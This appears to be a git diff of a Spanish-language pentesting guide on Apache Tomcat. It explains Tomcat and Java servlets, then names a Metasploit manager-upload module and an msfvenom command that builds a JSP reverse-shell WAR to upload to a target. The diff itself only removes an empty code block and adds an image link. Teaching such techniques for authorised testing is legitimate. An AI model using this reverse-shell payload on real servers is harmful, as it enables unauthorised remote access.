@@ -14,9 +14,6 @@ Estrictamente hablando, Tomcat no es un servidor web como Apache HTTPS Server o 
 
 Comenzado en 1999 y desarrollado como un proyecto de código abierto por la Apache Software Foundation (ASF), Apache Tomcat es un contenedor Java Servlet, o contenedor web, que proporciona la funcionalidad extendida para interactuar con Java Servlets, al tiempo que implementa varias especificaciones técnicas de la plataforma Java: JavaServer Pages (JSP), Java Expression Language (Java EL) y WebSocket.
 
-```
-```
-
 ### Que es un JAVA servlet
 
 Este es un software que permite que un servidor web maneje contenido web dinámico basado en Java utilizando el protocolo HTTP. JSP es una tecnología similar que permite a los desarrolladores crear contenido dinámico utilizando documentos HTML o XML. En términos de su capacidad para habilitar contenido dinámico, los Servlets de Java y JSP son ampliamente comparables a PHP o ASP.NET, solo basados ​​en el lenguaje de programación Java.
@@ -147,6 +144,8 @@ use exploit/multi/http/tomcat_mgr_upload
 ```
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=[Tu IP] LPORT=[Puerto] -f war -o revshell.war
 ```
+
+![Fuente: Hacking Articles](<../../.gitbook/assets/APACHE TOMCAT.png>)
 
 Después debes subir este archivo y acceder a `www.vulnerable.com/revshell`
 
